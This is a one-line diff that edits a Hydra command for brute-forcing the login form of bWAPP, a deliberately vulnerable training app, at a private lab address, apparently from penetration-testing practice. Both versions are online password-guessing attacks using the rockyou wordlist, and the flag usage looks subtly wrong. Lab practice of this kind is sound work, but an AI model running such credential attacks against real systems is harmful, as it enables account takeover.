@@ -1,1 +1,1 @@
-hydra 192.168.56.11 -v -V -l bee -p /usr/share/wordlists/rockyou.txt http-post-form"/BWAPP/login.php:login=^USER^&password=^PASS^&action=login:F=incorrect"
+hydra 192.168.56.11 -v -V -l /usr/share/wordlists/rockyou.txt -p /usr/share/wordlists/rockyou.txt http-post-form "/BWAPP/login.php:login=^USER^&password=^PASS^&action=login:F=incorrect"
